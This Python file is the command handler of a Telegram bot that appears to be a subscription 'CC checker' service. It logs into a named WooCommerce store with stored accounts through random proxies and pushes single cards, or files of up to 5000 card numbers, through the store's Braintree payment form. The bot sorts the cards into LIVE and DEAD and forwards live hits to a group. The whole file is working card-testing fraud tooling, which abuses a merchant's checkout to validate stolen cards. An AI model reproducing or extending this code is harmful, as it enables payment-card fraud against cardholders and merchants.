"""
handlers/wc_bt_handler.py — WooCommerce + Braintree Gate Commands

Management (Owner only):
  /wcbtadd <email> <password>   — Add camius.com login account
  /wcbtlist                      — List all accounts + stats
  /wcbtremove <email>            — Remove account
  /wcbtstatus                    — Test gate health
  /wcbtclear                     — Clear session cache

Check Commands (Owner + premium, separate from /chk and /mchk):
  /wchk <card>                   — Single card check via WC+BT gate
  /wmchk                         — Mass check via WC+BT gate (reply/send .txt)

These are COMPLETELY SEPARATE from /chk and /mchk (Shopify).
"""
import asyncio
import logging
import os
import time
import uuid

from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

import config
import database.db as db
from core.parser import parse_cc, parse_mass
from core.bin_lookup import lookup_bin
from gateways.wc_bt_gate import check_wc_bt_gate
from gateways.base import CCStatus
from utils.formatter import format_single_result
from utils.error_handler import notify_owner_on_error

logger = logging.getLogger("CC-Checker.WCBT")

SITE_URL = "https://www.camius.com"
SITE_LABEL = "camius.com (WC+BT)"

# ── Active mass check sessions (user_id → running) ─────────────────────────────
_wm_active: dict[int, bool] = {}
_wm_stop:   dict[tuple, asyncio.Event] = {}


def register_wc_bt_commands(app: Client):
    """Register all WC+BT commands on the Pyrogram app."""

    # ─────────────────────────────────────────────────────────────────────────
    # MANAGEMENT COMMANDS
    # ─────────────────────────────────────────────────────────────────────────

    @app.on_message(filters.command("wcbtadd"))
    @notify_owner_on_error
    async def cmd_wcbt_add(client: Client, msg: Message):
        """Owner only: /wcbtadd email password"""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        parts = msg.text.split(maxsplit=2)
        if len(parts) < 3:
            await msg.reply(
                "⚠️ <b>Usage:</b> <code>/wcbtadd email password</code>\n\n"
                "<i>Example:</i>\n"
                "<code>/wcbtadd user@gmail.com mypassword123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        email    = parts[1].strip()
        password = parts[2].strip()
        wait     = await msg.reply(
            f"🔄 <b>Adding account...</b> <code>{email}</code>",
            parse_mode=enums.ParseMode.HTML
        )

        ok = await db.wc_bt_add_account(SITE_URL, email, password, msg.from_user.id)
        if not ok:
            await wait.edit_text("❌ <b>DB error — failed to add account.</b>", parse_mode=enums.ParseMode.HTML)
            return

        # Quick login test
        t0 = time.monotonic()
        try:
            from gateways.wc_bt_gate import _wp_login, _get_nonce_and_bt_token
            proxy = None
            try:
                from core.proxy_manager import get_random_proxy
                proxy = get_random_proxy()
            except Exception:
                pass

            cookies = await _wp_login(SITE_URL, email, password, proxy)
            if cookies:
                wc_nonce, bt_token = await _get_nonce_and_bt_token(SITE_URL, cookies, proxy)
                l_icon = "✅"
                n_icon = "✅" if wc_nonce else "⚠️"
                t_icon = "✅" if bt_token else "⚠️"
                n_msg  = f"<code>{wc_nonce}</code>" if wc_nonce else "Not found in page"
                t_msg  = "Found" if bt_token else "Not in page (AJAX fallback used)"
            else:
                l_icon = n_icon = t_icon = "❌"
                n_msg  = t_msg = "N/A"
        except Exception as e:
            l_icon = n_icon = t_icon = "⚠️"
            n_msg  = t_msg = str(e)[:40]

        ms = int((time.monotonic() - t0) * 1000)
        count = len(await db.wc_bt_get_active_accounts(SITE_URL))

        await wait.edit_text(
            f"<b>🏦 WC+BT Account Added!</b>\n"
            f"<blockquote>"
            f"🔗 <b>Site:</b> <code>camius.com</code>\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{l_icon} <b>Login:</b> {'OK' if l_icon == '✅' else 'FAILED'}\n"
            f"{n_icon} <b>WC Nonce:</b> {n_msg}\n"
            f"{t_icon} <b>BT Token:</b> {t_msg}\n"
            f"⚡ <b>Speed:</b> <code>{ms}ms</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Total Accounts:</b> <code>{count}</code>\n"
            f"<i>Use /wchk or /wmchk to check cards via this gate.</i>"
            f"</blockquote>",
            parse_mode=enums.ParseMode.HTML
        )

    @app.on_message(filters.command("wcbtlist"))
    @notify_owner_on_error
    async def cmd_wcbt_list(client: Client, msg: Message):
        """Owner only: List all WC+BT accounts."""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        accounts = await db.wc_bt_get_all_accounts()
        if not accounts:
            await msg.reply(
                "⚠️ <b>No WC+BT accounts configured.</b>\n"
                "<i>Use /wcbtadd email password</i>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        lines = []
        for i, acc in enumerate(accounts, 1):
            icon  = "✅" if acc.get("is_active") else "❌"
            succ  = acc.get("success_count", 0)
            fail  = acc.get("fail_count", 0)
            total = succ + fail
            rate  = f"{int(succ/total*100)}%" if total else "N/A"
            last  = (acc.get("last_used") or "Never")[:10]
            lines.append(
                f"{i}. {icon} <code>{acc['email']}</code>\n"
                f"   ✅ {succ} | ❌ {fail} | 🎯 {rate} | 🕐 {last}"
            )

        await msg.reply(
            f"<b>🏦 WC+BT Accounts (camius.com)</b>\n"
            f"<blockquote>"
            + "\n".join(lines) +
            f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Total:</b> <code>{len(accounts)}</code>"
            f"</blockquote>",
            parse_mode=enums.ParseMode.HTML
        )

    @app.on_message(filters.command("wcbtremove"))
    @notify_owner_on_error
    async def cmd_wcbt_remove(client: Client, msg: Message):
        """Owner only: /wcbtremove email"""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        parts = msg.text.split(maxsplit=1)
        if len(parts) < 2:
            await msg.reply("⚠️ <b>Usage:</b> <code>/wcbtremove email@domain.com</code>", parse_mode=enums.ParseMode.HTML)
            return

        email = parts[1].strip()
        await db.wc_bt_remove_account(email, SITE_URL)
        try:
            from gateways.wc_bt_gate import invalidate_wc_bt_cache
            invalidate_wc_bt_cache(SITE_URL, email)
        except Exception:
            pass
        await msg.reply(f"✅ <b>Removed:</b> <code>{email}</code>", parse_mode=enums.ParseMode.HTML)

    @app.on_message(filters.command("wcbtstatus"))
    @notify_owner_on_error
    async def cmd_wcbt_status(client: Client, msg: Message):
        """Owner only: Test WC+BT gate status."""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        wait = await msg.reply("🔍 <b>Testing WC+BT gate...</b>", parse_mode=enums.ParseMode.HTML)
        accounts = await db.wc_bt_get_active_accounts(SITE_URL)
        count = len(accounts)

        if not accounts:
            await wait.edit_text(
                "❌ <b>No active accounts!</b>\n<i>Use /wcbtadd to configure.</i>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        acc = accounts[0]
        t0 = time.monotonic()
        try:
            from gateways.wc_bt_gate import _wp_login, _get_nonce_and_bt_token
            proxy = None
            try:
                from core.proxy_manager import get_random_proxy
                proxy = get_random_proxy()
            except Exception:
                pass

            cookies = await _wp_login(SITE_URL, acc["email"], acc["password"], proxy)
            login_ok = bool(cookies)
            wc_nonce = bt_token = None
            if login_ok:
                wc_nonce, bt_token = await _get_nonce_and_bt_token(SITE_URL, cookies, proxy)
            ms = int((time.monotonic() - t0) * 1000)

            l_i = "✅" if login_ok  else "❌"
            n_i = "✅" if wc_nonce  else "❌"
            t_i = "✅" if bt_token  else "⚠️"
            status = "🟢 READY" if (login_ok and wc_nonce) else "🔴 NOT READY"
        except Exception as e:
            l_i = n_i = t_i = "❌"
            ms = 0
            status = f"🔴 ERROR: {e}"

        await wait.edit_text(
            f"<b>🏦 WC+BT Gate Status</b>\n"
            f"<blockquote>"
            f"🔗 <b>Site:</b> <code>camius.com</code>\n"
            f"📊 <b>Accounts:</b> <code>{count} active</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{l_i} <b>Login:</b> {'OK' if l_i == '✅' else 'FAILED'}\n"
            f"{n_i} <b>WC Nonce:</b> {'OK' if n_i == '✅' else 'Missing'}\n"
            f"{t_i} <b>BT Token:</b> {'OK' if t_i == '✅' else 'AJAX fallback'}\n"
            f"⚡ <b>Speed:</b> <code>{ms}ms</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 <b>Status:</b> <b>{status}</b>"
            f"</blockquote>",
            parse_mode=enums.ParseMode.HTML
        )

    @app.on_message(filters.command("wcbtclear"))
    @notify_owner_on_error
    async def cmd_wcbt_clear(client: Client, msg: Message):
        """Owner only: Clear session cache → force fresh login."""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return
        try:
            from gateways.wc_bt_gate import invalidate_wc_bt_cache
            invalidate_wc_bt_cache()
            await msg.reply(
                "✅ <b>Session cache cleared!</b>\n<i>Next /wchk will do a fresh login.</i>",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            await msg.reply(f"❌ <b>Error:</b> <code>{e}</code>", parse_mode=enums.ParseMode.HTML)

    # ─────────────────────────────────────────────────────────────────────────
    # CHECK COMMANDS — COMPLETELY SEPARATE FROM /chk AND /mchk
    # ─────────────────────────────────────────────────────────────────────────

    @app.on_message(filters.command("wchk"))
    @notify_owner_on_error
    async def cmd_wchk(client: Client, msg: Message):
        """
        Single CC check via WC+BT (camius.com) gate.
        Usage: /wchk 4111111111111111|12|2027|123
        """
        user_id = msg.from_user.id
        if user_id not in config.OWNER_IDS:
            plan_info = await db.get_user_plan(user_id)
            if plan_info["plan"] in ("free", None, ""):
                await msg.reply(
                    "❌ <b>Access Denied!</b>\n"
                    "You need an active subscription to use /wchk.\n"
                    "Redeem a key via <code>/redeem &lt;key&gt;</code>.",
                    parse_mode=enums.ParseMode.HTML
                )
                return

        # Gate configured?
        if not await db.wc_bt_is_configured(SITE_URL):
            await msg.reply(
                "❌ <b>WC+BT gate not configured!</b>\n"
                "Owner must add account with /wcbtadd first.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        # Parse card
        text    = msg.text.strip()
        cc_text = text[len("/wchk"):].strip()
        if not cc_text:
            await msg.reply(
                "⚠️ <b>Usage:</b> <code>/wchk 4111111111111111|12|2027|123</code>\n\n"
                "🏦 <b>WC+BT Gate</b> (camius.com)\n"
                "• ✅ Payment Method Added → LIVE\n"
                "• 🔥 Do Not Honor → LIVE\n"
                "• ❌ Declined → DEAD",
                parse_mode=enums.ParseMode.HTML
            )
            return

        card = parse_cc(cc_text)
        if not card:
            await msg.reply(
                "❌ <b>Invalid card format!</b>\n"
                "Use: <code>4111111111111111|12|2027|123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        wait_msg = await msg.reply(
            f"⏳ <b>Checking via WC+BT...</b>\n"
            f"<code>{card.number}|{card.month}|{card.year}|{card.cvv}</code>\n"
            f"<i>🏦 Gate: camius.com</i>",
            parse_mode=enums.ParseMode.HTML
        )

        t0     = time.monotonic()
        result = await check_wc_bt_gate(card)
        elapsed = time.monotonic() - t0

        await db.increment_check_count(user_id)
        user_stats = await db.get_user_stats(user_id)
        quota = user_stats["total"]

        bin_info  = await lookup_bin(card.bin)
        user_name = msg.from_user.username or msg.from_user.first_name or "user"
        text_out  = format_single_result(card, result, bin_info, elapsed, username=user_name, quota=quota)

        await wait_msg.edit_text(text_out, parse_mode=enums.ParseMode.HTML)

        await db.log_check(
            user_id=user_id,
            card_number=card.number,
            card_bin=card.bin,
            status=result.status.value,
            gateway=result.gateway,
            is_vbv=result.is_vbv,
            message=result.message,
        )

        # Forward hit to group/owner if live
        if result.is_live:
            try:
                from handlers.checker import _log_and_forward_hit
                await _log_and_forward_hit(
                    client=client,
                    user_id=user_id,
                    username=msg.from_user.username,
                    first_name=msg.from_user.first_name or "User",
                    card=card,
                    result=result,
                    elapsed=elapsed,
                )
            except Exception as e:
                logger.debug(f"wchk forward hit error: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # /wmchk — Mass check via WC+BT gate
    # ─────────────────────────────────────────────────────────────────────────

    @app.on_callback_query(filters.create(lambda _, __, cb: cb.data and cb.data.startswith("stop_wmchk_")))
    async def _stop_wmchk_cb(client: Client, cb):
        parts  = cb.data.split("_")
        # stop_wmchk_{chat_id}_{session_id}
        try:
            chat_id    = int(parts[2])
            session_id = parts[3] if len(parts) > 3 else None
        except (IndexError, ValueError):
            await cb.answer("Invalid stop data.", show_alert=True)
            return

        key = (chat_id, session_id)
        ev  = _wm_stop.get(key)
        if ev:
            ev.set()
            await cb.answer("🛑 Stopping WC+BT check...", show_alert=True)
        else:
            await cb.answer("⚠️ No active WC+BT check found.", show_alert=True)

    @app.on_message(filters.command("wmchk") & (filters.document | filters.text))
    @notify_owner_on_error
    async def cmd_wmchk(client: Client, msg: Message):
        """
        Mass CC check via WC+BT gate (camius.com).
        Send or reply to a .txt file with /wmchk.
        """
        user_id  = msg.from_user.id
        is_owner = user_id in config.OWNER_IDS

        if not is_owner:
            plan_info = await db.get_user_plan(user_id)
            if plan_info["plan"] in ("free", None, ""):
                await msg.reply(
                    "❌ <b>Access Denied!</b>\n"
                    "You need an active subscription for /wmchk.",
                    parse_mode=enums.ParseMode.HTML
                )
                return

        if not await db.wc_bt_is_configured(SITE_URL):
            await msg.reply(
                "❌ <b>WC+BT gate not configured!</b>\n"
                "Owner must add account with /wcbtadd first.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        if _wm_active.get(user_id) and not is_owner:
            await msg.reply(
                "⚠️ <b>You already have a WC+BT check running!</b>\n"
                "Stop it first or wait for completion.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        # Find document
        doc_msg = None
        if msg.document:
            doc_msg = msg
        elif msg.reply_to_message and msg.reply_to_message.document:
            doc_msg = msg.reply_to_message

        if not doc_msg:
            await msg.reply(
                "❌ <b>How to use /wmchk:</b>\n\n"
                "<b>Method 1:</b> Send <code>.txt</code> file with caption <code>/wmchk</code>\n"
                "<b>Method 2:</b> Reply to a <code>.txt</code> file with <code>/wmchk</code>\n\n"
                "📄 Each line = one card: <code>4111111111111111|12|2026|123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        doc = doc_msg.document
        if not (doc.file_name or "").lower().endswith(".txt"):
            await msg.reply("❌ Only <code>.txt</code> files supported.", parse_mode=enums.ParseMode.HTML)
            return

        max_size = 10_000_000 if is_owner else 1_000_000
        if doc.file_size > max_size:
            await msg.reply(
                f"❌ File too large. Max <b>{'10MB' if is_owner else '1MB'}</b>.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        wait_msg = await msg.reply("📥 <b>Downloading file...</b>", parse_mode=enums.ParseMode.HTML)

        # Download + parse
        tmp_path = None
        try:
            tmp_path = await client.download_media(doc)
            with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            await wait_msg.edit_text(f"❌ Failed to read file: <code>{e}</code>", parse_mode=enums.ParseMode.HTML)
            return
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

        cards = parse_mass(content)
        if not cards:
            await wait_msg.edit_text(
                "❌ No valid cards found in file.\n"
                "Format: <code>4111111111111111|12|2026|123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        total = len(cards)
        max_cards = 5000 if is_owner else 500
        if total > max_cards:
            cards = cards[:max_cards]
            total = max_cards

        # Session
        session_id = uuid.uuid4().hex[:8]
        sess_key   = (msg.chat.id, session_id)
        stop_ev    = asyncio.Event()
        _wm_stop[sess_key]   = stop_ev
        _wm_active[user_id]  = True

        max_workers = config.OWNER_WORKERS if is_owner else 10
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_wmchk_{msg.chat.id}_{session_id}")]
        ])

        # Animated start
        for frame in [
            "⚡ <b>Initializing WC+BT pipeline...</b>",
            "⚡ <b>Initializing</b> | 🔍 <i>Parsing cards...</i>",
            (
                f"<b>╔══════ 🏦 WC+BT MASS CHECK ══════╗</b>\n\n"
                f"<blockquote>"
                f"📋 <b>Cards:</b> <code>{total}</code>\n"
                f"🌐 <b>Gate:</b> <code>camius.com (WC+Braintree)</code>\n"
                f"⚡ <b>Workers:</b> <code>{max_workers}</code>\n"
                f"{'👑 <b>Owner Mode</b>' if is_owner else '⭐ <b>Premium Mode</b>'}"
                f"</blockquote>\n\n"
                f"<i>🚀 Starting WC+BT check now...</i>"
            ),
        ]:
            try:
                await wait_msg.edit_text(frame, parse_mode=enums.ParseMode.HTML, reply_markup=stop_markup)
            except Exception:
                pass
            await asyncio.sleep(0.5)

        # State tracking
        lock           = asyncio.Lock()
        done           = 0
        live_count     = 0
        dead_count     = 0
        error_count    = 0
        charged_list:  list[str] = []
        live_list:     list[str] = []
        dead_list:     list[str] = []
        start_ts       = time.monotonic()
        last_edit_ts   = 0.0
        sem            = asyncio.Semaphore(max_workers)

        async def _worker(card):
            nonlocal done, live_count, dead_count, error_count, last_edit_ts

            async with sem:
                if stop_ev.is_set():
                    return

                t0 = time.monotonic()
                try:
                    result = await check_wc_bt_gate(card)
                except Exception as e:
                    result = None
                    logger.debug(f"wmchk worker error: {e}")
                elapsed = time.monotonic() - t0
                card_str = f"{card.number}|{card.month}|{card.year}|{card.cvv}"

                async with lock:
                    done += 1
                    now = time.monotonic()

                    if result is None or result.status == CCStatus.ERROR:
                        error_count += 1
                    elif result.is_live:
                        live_count += 1
                        tag = "✅ CHARGED" if result.status == CCStatus.CHARGED else (
                              "✅ ADDED"   if result.status == CCStatus.LIVE_VBV else
                              "🔥 LIVE")
                        entry = f"{tag} | {card_str} | {result.message[:50]} | {elapsed:.1f}s"
                        if result.status == CCStatus.CHARGED:
                            charged_list.append(entry)
                        else:
                            live_list.append(entry)
                    else:
                        dead_count += 1
                        dead_list.append(f"❌ DEAD | {card_str} | {(result.message or 'Declined')[:40]}")

                    # Progress update every 5 cards or 4 seconds
                    if done % 5 == 0 or (now - last_edit_ts) >= 4.0:
                        last_edit_ts = now
                        elapsed_total = int(now - start_ts)
                        pct  = int(done / total * 100)
                        bar  = "█" * (pct // 10) + "░" * (10 - pct // 10)
                        speed = done / max(elapsed_total, 1)
                        eta  = int((total - done) / max(speed, 0.01))
                        try:
                            await wait_msg.edit_text(
                                f"<b>🏦 WC+BT Mass Check Running</b>\n"
                                f"<blockquote>"
                                f"[{bar}] <code>{pct}%</code>\n"
                                f"📋 <b>Progress:</b> <code>{done}/{total}</code>\n"
                                f"✅ <b>Live:</b> <code>{live_count}</code>  "
                                f"❌ <b>Dead:</b> <code>{dead_count}</code>  "
                                f"⚠️ <b>Errors:</b> <code>{error_count}</code>\n"
                                f"⚡ <b>Speed:</b> <code>{speed:.1f} cards/s</code>\n"
                                f"⏱ <b>ETA:</b> <code>{eta}s</code>"
                                f"</blockquote>",
                                parse_mode=enums.ParseMode.HTML,
                                reply_markup=stop_markup
                            )
                        except Exception:
                            pass

                    # Forward live hits to group (masked CC)
                    if result and result.is_live:
                        try:
                            bin_info = await lookup_bin(card.bin)
                            from handlers.checker import _log_and_forward_hit
                            await _log_and_forward_hit(
                                client=client,
                                user_id=user_id,
                                username=msg.from_user.username,
                                first_name=msg.from_user.first_name or "User",
                                card=card,
                                result=result,
                                elapsed=elapsed,
                            )
                        except Exception as ex:
                            logger.debug(f"wmchk hit forward: {ex}")

        # Run all workers
        try:
            tasks = [asyncio.create_task(_worker(c)) for c in cards]
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception:
            pass
        finally:
            _wm_active.pop(user_id, None)
            _wm_stop.pop(sess_key, None)

        stopped = stop_ev.is_set()
        total_time = int(time.monotonic() - start_ts)
        speed = done / max(total_time, 1)

        # Final summary
        summary_lines = [
            f"<b>{'🛑 WC+BT Check Stopped!' if stopped else '✅ WC+BT Mass Check Done!'}</b>\n",
            f"<blockquote>",
            f"🌐 <b>Gate:</b> <code>{SITE_LABEL}</code>",
            f"📋 <b>Total:</b> <code>{done}/{total}</code>",
            f"✅ <b>Live:</b> <code>{live_count}</code>",
            f"❌ <b>Dead:</b> <code>{dead_count}</code>",
            f"⚠️ <b>Errors:</b> <code>{error_count}</code>",
            f"⏱ <b>Time:</b> <code>{total_time}s</code>",
            f"⚡ <b>Speed:</b> <code>{speed:.1f} cards/s</code>",
            f"</blockquote>",
        ]

        # Live hits inline (first 10)
        all_live = charged_list + live_list
        if all_live:
            summary_lines.append(f"\n<b>🔥 Live Hits ({len(all_live)}):</b>")
            for h in all_live[:10]:
                summary_lines.append(f"<code>{h}</code>")
            if len(all_live) > 10:
                summary_lines.append(f"<i>...+{len(all_live)-10} more in file below</i>")

        await wait_msg.edit_text(
            "\n".join(summary_lines),
            parse_mode=enums.ParseMode.HTML,
        )

        # Send results file if there are live hits
        if all_live or dead_list:
            import io
            file_lines = []
            if all_live:
                file_lines.append(f"=== LIVE ({len(all_live)}) ===")
                file_lines.extend(all_live)
                file_lines.append("")
            if dead_list:
                file_lines.append(f"=== DEAD ({len(dead_count if isinstance(dead_count, list) else dead_list)}) ===")
                file_lines.extend(dead_list[:200])  # cap dead in file

            content_bytes = "\n".join(file_lines).encode("utf-8")
            buf = io.BytesIO(content_bytes)
            buf.name = f"wmchk_results_{session_id}.txt"
            buf.seek(0)

            caption = (
                f"📄 <b>WC+BT Results</b>\n"
                f"✅ Live: <code>{live_count}</code> | "
                f"❌ Dead: <code>{dead_count}</code> | "
                f"Total: <code>{done}</code>"
            )
            try:
                await msg.reply_document(
                    document=buf,
                    caption=caption,
                    parse_mode=enums.ParseMode.HTML,
                )
            except Exception as e:
                logger.debug(f"wmchk file send error: {e}")
